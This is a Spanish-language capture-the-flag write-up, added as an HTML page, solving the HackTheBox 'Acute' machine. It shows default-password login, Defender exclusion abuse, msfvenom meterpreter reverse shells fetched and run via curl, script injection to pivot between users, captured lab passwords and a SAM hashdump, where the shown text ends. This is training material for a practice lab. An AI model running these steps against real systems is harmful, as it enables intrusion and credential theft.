@@ -1,0 +1,631 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Acute</title>
+
+  <meta name="description" content="Resolución de la máquina Acute de la plataforma de HackTheBox">
+  <meta name="author" content="GatoGamer1155">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Acute">
+  <meta name="twitter:description" content="Resolución de la máquina Acute de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="GatoGamer1155">  
+  <meta name="twitter:image" content="/images/htb/acute.png" />
+
+  <meta property="og:site_name" content="GatoGamer1155" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Acute">
+  <meta property="og:description" content="Resolución de la máquina Acute de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/htb/acute.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/htb/acute.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Acute" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="GatoGamer1155">
+          <h1 class="panel-cover__title panel-title scale-up-center">GatoGamer1155</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del Hacking y CTFs</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/htb" title="GatoGamer1155" class="blog-button">HackTheBox</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+              
+              <li class="navigation__item grow">
+                <a href="https://github.com/gatogamer1155" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/gatogamer1155" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/gatogamer1155" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@gatogamer1155" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:gatogamer1155@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#enumeration">Enumeración</a></li>
+        <li><a href="#shell-edavies">Shell - edavies</a></li>
+        <li><a href="#shell-imonks">Shell - imonks</a></li>
+        <li><a href="#shell-jmorgan">Shell - jmorgan</a></li>
+        <li><a href="#shell-awallace">Shell - awallace</a></li>
+        <li><a href="#shell-administrator">Shell - Administrator</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/htb/acute.png" style="float: right; margin-right:0px; margin-left:0px; height:60px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Acute</h2><br>
+  </header>
+  
+<section class="post" id="enumeration">
+<br><h3 class="post-title">Enumeración</h3><br>
+
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code> donde encontramos solo un puerto tcp abierto que es el <code class="language-plaintext highlighter-rouge">443</code> que corre un servicio <code class="language-plaintext highlighter-rouge">https</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ nmap </span><span class="p">10.10.11.145
+Nmap scan report for 10.10.11.145  
+PORT    STATE SERVICE
+443/tcp open  https</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al conectarnos con <code class="language-plaintext highlighter-rouge">openssl</code> al puerto 443 para inspeccionar el certificado en el <code class="language-plaintext highlighter-rouge">CN</code> nos muestra el dominio para el que esta destinado que es <code class="language-plaintext highlighter-rouge">atsserver.acute.local</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ openssl </span><span class="p">s_client -connect 10.10.11.145:443 | </span><span class="ve">head</span><span class="p">
+Can't use SSL_get_servername
+depth=0 CN = atsserver.acute.local
+verify error:num=20:unable to get local issuer certificate
+verify return:1
+depth=0 CN = atsserver.acute.local
+verify error:num=21:unable to verify the first certificate
+verify return:1
+depth=0 CN = atsserver.acute.local
+verify return:1
+CONNECTED(00000003)
+---
+Certificate chain
+ 0 s:CN = atsserver.acute.local
+   i:DC = local, DC = acute, CN = acute-ATSSERVER-CA
+   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
+   v:NotBefore: Jan  6 06:34:58 2022 GMT; NotAfter: Jan  4 06:34:58 2030 GMT  
+---</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Como probablemente nos resuelva a una web diferente cuando entremos desde el <code class="language-plaintext highlighter-rouge">dominio</code> existente lo agregaremos a la ultima linea del archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ echo </span><span class="am">"10.10.11.145 atsserver.acute.local" </span><span class="p">| </span><span class="ve">sudo tee</span><span class="p"> -a /etc/hosts  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La web principal parece ser una página interna algo simple de la empresa en cuestion</p>
+<a href="/htb/acute/1.png" target="_blank"><div><p><img src="/htb/acute/1.png"></p></div></a>
+
+<p class="plain-text">Si vamos a <code class="language-plaintext highlighter-rouge">About Us</code> encontramos 2 cosas interesantes, la primera es que podemos descargar un archivo <code class="language-plaintext highlighter-rouge">docx</code> y la segunda es que podemos ver algunos <code class="language-plaintext highlighter-rouge">usuarios</code></p>
+<a href="/htb/acute/2.png" target="_blank"><div><p><img src="/htb/acute/2.png"></p></div></a>
+
+<p class="plain-text">Con la lista de usuarios podemos crear una lista de posibles <code class="language-plaintext highlighter-rouge">usuarios</code> a nivel de sistema usando el formato <code class="language-plaintext highlighter-rouge">NSurname</code> que es utilizado en entornos <code class="language-plaintext highlighter-rouge">Windows</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">AWallace
+CHall
+EDavies
+IMonks
+JMorgan
+LHopkins</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ademas de eso podemos descargar el archivo <code class="language-plaintext highlighter-rouge">docx</code> y abrirlo usando <code class="language-plaintext highlighter-rouge">libreoffice</code></p>
+<a href="/htb/acute/3.png" target="_blank"><div><p><img src="/htb/acute/3.png"></p></div></a>
+
+</section>
+
+<section class="post" id="shell-edavies">
+<br><h3 class="post-title">Shell - edavies</h3><br>
+
+<p class="plain-text">En el archivo de office se invita a los usuarios a cambiar la contraseña que esta por <code class="language-plaintext highlighter-rouge">defecto</code> lo antes posible, la contraseña por defecto nos dice que es <code class="language-plaintext highlighter-rouge">Password1!</code></p>
+<a href="/htb/acute/4.png" target="_blank"><div><p><img src="/htb/acute/4.png"></p></div></a>
+
+<p class="plain-text">Tambien la ruta <code class="language-plaintext highlighter-rouge">/Acute_Staff_Access</code> en la web que si lo abrimos en la web vemos que es un <code class="language-plaintext highlighter-rouge">Windows PowerShell Web Access</code> pero necesitamos credenciales</p>
+<a href="/htb/acute/5.png" target="_blank"><div><p><img src="/htb/acute/5.png"></p></div></a>
+
+<p class="plain-text">Necesitamos 3 datos para acceder aqui, un <code class="language-plaintext highlighter-rouge">usuario</code>, su <code class="language-plaintext highlighter-rouge">contraseña</code> y el nombre de un <code class="language-plaintext highlighter-rouge">equipo</code> del dominio donde vamos a obtener una powershell interactiva</p>
+<a href="/htb/acute/6.png" target="_blank"><div><p><img src="/htb/acute/6.png"></p></div></a>
+
+<p class="plain-text">Mirando los metadatos del docx usando <code class="language-plaintext highlighter-rouge">exiftool</code> encontramos que se creo en el equipo <code class="language-plaintext highlighter-rouge">Acute-PC01</code>, ahora tenemos el nombre de un equipo que necesitamos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ exiftool </span><span class="p">New_Starter_CheckList_v7.docx
+ExifTool Version Number         : 12.64
+File Name                       : New_Starter_CheckList_v7.docx
+Directory                       : .
+File Size                       : 35 kB
+File Modification Date/Time     : 2023:08:22 20:28:18-06:00
+File Access Date/Time           : 2023:08:22 20:28:29-06:00
+File Inode Change Date/Time     : 2023:08:22 20:28:24-06:00
+File Permissions                : -rw-r--r--
+File Type                       : DOCX
+File Type Extension             : docx
+MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document  
+Zip Required Version            : 20
+Zip Bit Flag                    : 0x0006
+Zip Compression                 : Deflated
+Zip Modify Date                 : 1980:01:01 00:00:00
+Zip CRC                         : 0x079b7eb2
+Zip Compressed Size             : 428
+Zip Uncompressed Size           : 2527
+Zip File Name                   : [Content_Types].xml
+Creator                         : FCastle
+Description                     : Created on Acute-PC01
+Last Modified By                : Daniel
+Revision Number                 : 8
+Last Printed                    : 2021:01:04 15:54:00Z
+Create Date                     : 2021:12:08 14:21:00Z
+Modify Date                     : 2021:12:22 00:39:00Z
+Template                        : Normal.dotm
+Total Edit Time                 : 2.6 hours
+Pages                           : 3
+Words                           : 886
+Characters                      : 5055
+Application                     : Microsoft Office Word
+Doc Security                    : None
+Lines                           : 42
+Paragraphs                      : 11
+Scale Crop                      : No
+Heading Pairs                   : Title, 1
+Titles Of Parts                 : 
+Company                         : University of Marvel
+Links Up To Date                : No
+Characters With Spaces          : 5930
+Shared Doc                      : No
+Hyperlinks Changed              : No
+App Version                     : 16.0000</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La contraseña por defecto funciona para el usuario <code class="language-plaintext highlighter-rouge">EDavies</code> en el equipo Acute-PC01</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Username: EDavies
+Password: Password1!
+Computer: Acute-PC01</span>
+</code></pre></div></div><br>
+<a href="/htb/acute/7.png" target="_blank"><div><p><img src="/htb/acute/7.png"></p></div></a>
+
+<p class="plain-text">Al ingresar estas credenciales son validas por lo que ganamos acceso a una <code class="language-plaintext highlighter-rouge">powershell</code> interactiva como el usuario <code class="language-plaintext highlighter-rouge">edavies</code> en el equipo Acute-PC01</p>
+<a href="/htb/acute/8.png" target="_blank"><div><p><img src="/htb/acute/8.png"></p></div></a>
+
+</section>
+
+<section class="post" id="shell-imonks">
+<br><h3 class="post-title">Shell - imonks</h3><br>
+
+<p class="plain-text">Si intentamos enumerar el sistema usando <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">winpeas</a> al intentar ejecutarlo nos dice que se ha bloqueado el archivo porque es posible que sea un virus malicioso</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\edavies\Documents> </span><span class="am">curl </span><span class="p">10.10.14.10/winpeas.exe </span><span class="c1">-o </span><span class="p">winpeas.exe
+PS C:\Users\edavies\Documents> </span><span class="am">.\winpeas.exe</span><span class="ro">
+Program 'winpeas.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted software.  
+    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException 
+    + FullyQualifiedErrorId : NativeCommandFailed</span><span class="p">
+PS C:\Users\edavies\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">A través de los registros podemos enumerar rutas donde el <code class="language-plaintext highlighter-rouge">antivirus</code> no nos afecta, una interesante es <code class="language-plaintext highlighter-rouge">C:\Utils</code> ya que podemos escribir en ella sin que nos afecte</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Users\edavies\Documents> </span><span class="am">reg </span><span class="p">query </span><span class="az">'HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths'  </span><span class="p">
+ 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
+    C:\Utils    REG_DWORD    0x0
+    C:\Windows\System32    REG_DWORD    0x0
+ 
+PS C:\Users\edavies\Documents></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar <code class="language-plaintext highlighter-rouge">winpeas</code> en esta ruta se ejecuta sin problemas del antivirus, algo interesante que nos enumera es que hay una sesion <code class="language-plaintext highlighter-rouge">RDP</code> activa en el equipo</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="am">curl </span><span class="p">10.10.14.10/winpeas.exe </span><span class="c1">-o </span><span class="p">winpeas.exe
+PS C:\Utils> </span><span class="am">.\winpeas.exe</span><span class="p">
+
+</span><span class="az">╔══════════╣ </span><span class="ve">RDP Sessions
+</span><span class="c1">    SessID    pSessionName   pUserName      pDomainName              State     SourceIP  
+</span><span class="p">    1         Console        </span><span class="sa">edavies        ACUTE                    </span><span class="p">Active</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos pensar en ver la pantalla o detectar pulsaciones pero para hacerlo mas sencillo iniciamos creando un exe que nos envie una sesion de <code class="language-plaintext highlighter-rouge">meterpreter</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ msfvenom </span><span class="p">-p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f exe -o shell.exe  
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: shell.exe</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ahora definimos un listener con metasploit usando interfaz <code class="language-plaintext highlighter-rouge">tun0</code> y el puerto <code class="language-plaintext highlighter-rouge">443</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ sudo msfconsole </span><span class="p">-q
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) >> use exploit/multi/handler 
+</span><span class="az">[*] </span><span class="p">Using configured payload generic/shell_reverse_tcp
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set payload windows/x64/meterpreter/reverse_tcp  
+payload => windows/x64/meterpreter/reverse_tcp
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set lhost tun0
+lhost => tun0
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> set lport 443
+lport => 443
+[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
+</span><span class="az">
+[*] </span><span class="p">Started reverse TCP handler on 10.10.14.10:443</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente descargamos el archivo <code class="language-plaintext highlighter-rouge">shell.exe</code> y lo ejecutamos, el resultado es que recibimos una sesion de <code class="language-plaintext highlighter-rouge">meterpreter</code> como el usuario edavies con mas funciones</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="am">curl </span><span class="p">10.10.14.10/shell.exe </span><span class="c1">-o </span><span class="p">shell.exe  
+PS C:\Utils> </span><span class="am">.\shell.exe</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
+
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.10.14.10:443 
+</span><span class="az">[*] </span><span class="p">Sending stage (200774 bytes) to 10.10.11.145
+</span><span class="az">[*] </span><span class="p">Meterpreter session 1 opened (10.10.14.10:443 -> 10.10.11.145:49832)  
+
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Utils) > getuid
+Server username: ACUTE\edavies
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Utils) ></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Ya en la sesión de <code class="language-plaintext highlighter-rouge">meterpreter</code> como edavies tenemos la función <code class="language-plaintext highlighter-rouge">screenshare</code> que nos permite ver lo que pasa en la <code class="language-plaintext highlighter-rouge">pantalla</code> de la sesión rdp activa en tiempo real</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Utils) > screenshare
+[*] Preparing player...
+[*] Opening player at: /home/kali/VsMvfHpX.html  
+[*] Streaming...</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Después de unos segundos el usuario abre una <code class="language-plaintext highlighter-rouge">powershell</code> y define una credencial como <code class="language-plaintext highlighter-rouge">imonks</code>, despues intenta abrir una sesion con una <code class="language-plaintext highlighter-rouge">configuracion</code> especial</p>
+<a href="/htb/acute/9.png" target="_blank"><div><p><img src="/htb/acute/9.png"></p></div></a>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">$passwd = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlaintext -Force
+$cred = New-Object System.Management.Automation.PSCredential ("acute\imonks", $passwd)  
+Enter-PSSession -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">En los comandos intenta acceder con una configuración llamada <code class="language-plaintext highlighter-rouge">dc_manage</code>, en el docx podemos ver que es una configuracion que limita nuestros comandos</p>
+<a href="/htb/acute/11.png" target="_blank"><div><p><img src="/htb/acute/11.png"></p></div></a>
+
+<p class="plain-text">Ya con la credencial del usuario <code class="language-plaintext highlighter-rouge">imonks</code> podemos ejecutar comandos en el equipo <code class="language-plaintext highlighter-rouge">ATSSERVER</code> usando la configuracion <code class="language-plaintext highlighter-rouge">dc_manage</code> que veiamos en los comandos</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="ve">$SecPassword </span><span class="c1">= </span><span class="am">ConvertTo-SecureString </span><span class="az">"W3_4R3_th3_f0rce." </span><span class="c1">-AsPlaintext -Force</span><span class="p">
+PS C:\Utils> </span><span class="ve">$Cred </span><span class="c1">= </span><span class="am">New-Object </span><span class="p">System.Management.Automation.PSCredential(</span><span class="az">"Acute\IMonks"</span><span class="p">, </span><span class="ve">$SecPassword</span><span class="p">)
+PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">whoami </span><span class="p">}
+acute\imonks
+PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{</span><span class="am"> type </span><span class="p">..\Desktop\user.txt }  
+fc3**************************b2e
+PS C:\Utils></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-jmorgan">
+<br><h3 class="post-title">Shell - jmorgan</h3><br>
+
+<p class="plain-text">Además de la flag de user en el escritorio de <code class="language-plaintext highlighter-rouge">imonks</code> encontramos un script en <code class="language-plaintext highlighter-rouge">powershell</code> el cual define una credencial para el usuario <code class="language-plaintext highlighter-rouge">jmorgan</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">ls</span><span class="p"> ..\Desktop }
+ 
+     Directory: C:\Users\imonks\Desktop
+ 
+ Mode                 LastWriteTime         Length Name                               PSComputerName                    
+----                 -------------         ------ ----                               --------------                    
+-ar---         23/8/2023     03:05             34 user.txt                           ATSSERVER                         
+-a----         11/1/2022     18:04            602 wm.ps1                             ATSSERVER                         
+ 
+PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command</span><span class="p"> { </span><span class="am">type</span><span class="p"> ..\Desktop\wm.ps1 }
+$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'  
+$passwd = $securepasswd | ConvertTo-SecureString
+$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
+Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
+PS C:\Utils></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Sin embargo al intentar definirla nos devuelve un <code class="language-plaintext highlighter-rouge">error</code>, pero probablemente es debido al contexto de <code class="language-plaintext highlighter-rouge">powershell</code> con informacion a la que no podemos acceder</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="ve">$securepasswd </span><span class="c1">= </span><span class="az">'01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'  </span><span class="p">
+PS C:\Utils> </span><span class="ve">$passwd </span><span class="c1">= </span><span class="ve">$securepasswd </span><span class="p">| </span><span class="am">ConvertTo-SecureString</span><span class="p">
+</span><span class="ro">ConvertTo-SecureString : Key not valid for use in specified state.
+ 
+At line:1 char:27
++ $passwd = $securepasswd | ConvertTo-SecureString
++                           ~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidArgument: (:) [ConvertTo-SecureString], CryptographicException
+    + FullyQualifiedErrorId : ImportSecureString_InvalidArgument_CryptographicError,Microsoft.PowerShell.Commands.Conv 
+   ertToSecureStringCommand</span><span class="p">
+PS C:\Utils></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo que podemos hacer el modificar el comando que ejecuta en <code class="language-plaintext highlighter-rouge">Acute-PC01</code> por el archivo <code class="language-plaintext highlighter-rouge">shell.exe</code> que subimos antes, para en caso de ejecutarlo nos envie una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ ((</span><span class="am">type </span><span class="az">"..\Desktop\wm.ps1"</span><span class="c1"> -Raw</span><span class="p">) </span><span class="c1">-Replace </span><span class="az">"Get-Volume"</span><span class="p">,</span><span class="az">"cmd /c C:\Utils\shell.exe"</span><span class="p">) | </span><span class="am">Set-Content </span><span class="c1">-Path </span><span class="p">..\Desktop\wm.ps1 }
+PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">type </span><span class="p">..\Desktop\wm.ps1 }
+$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'  
+$passwd = $securepasswd | ConvertTo-SecureString
+$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
+Invoke-Command -ScriptBlock {cmd /c C:\Utils\shell.exe} -ComputerName Acute-PC01 -Credential $creds
+PS C:\Utils></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Finalmente ejecutamos el script de powershell y el ejecutar el <code class="language-plaintext highlighter-rouge">shell.exe</code> nos envia una sesión de meterpreter pero como el usuario <code class="language-plaintext highlighter-rouge">jmorgan</code> que es admin local</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Utils> </span><span class="am">Invoke-Command </span><span class="c1">-ComputerName </span><span class="p">ATSSERVER </span><span class="c1">-ConfigurationName </span><span class="p">dc_manage </span><span class="c1">-Credential </span><span class="ve">$Cred </span><span class="c1">-Command </span><span class="p">{ </span><span class="am">C:\Users\imonks\Desktop\wm.ps1</span><span class="p"> }</span>
+</code></pre></div></div><br>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">[</span><span class="ve">msf</span><span class="p">](</span><span class="am">Jobs</span><span class="p">:0 </span><span class="az">Agents</span><span class="p">:0) exploit(</span><span class="ro">multi/handler</span><span class="p">) >> run
+
+</span><span class="az">[*] </span><span class="p">Started reverse TCP handler on 10.10.14.10:443 
+</span><span class="az">[*] </span><span class="p">Sending stage (200774 bytes) to 10.10.11.145
+</span><span class="az">[*] </span><span class="p">Meterpreter session 2 opened (10.10.14.10:443 -> 10.10.11.145:49856)  
+
+(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\Users\jmorgan\Documents) > getuid
+Server username: ACUTE\jmorgan
+(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\Users\jmorgan\Documents) ></span>
+</code></pre></div></div><br>
+
+</section>
+
+<section class="post" id="shell-awallace">
+<br><h3 class="post-title">Shell - awallace</h3><br>
+
+<p class="plain-text">Al ser <code class="language-plaintext highlighter-rouge">jmorgan</code> un administrador local tiene privilegios locales sobre el equipo, por lo que podemos dumpear la <code class="language-plaintext highlighter-rouge">sam</code> usando la funcion <code class="language-plaintext highlighter-rouge">hashdump</code> de meterpreter</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">2</span><span class="p">)(C:\Users\jmorgan\Documents) > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
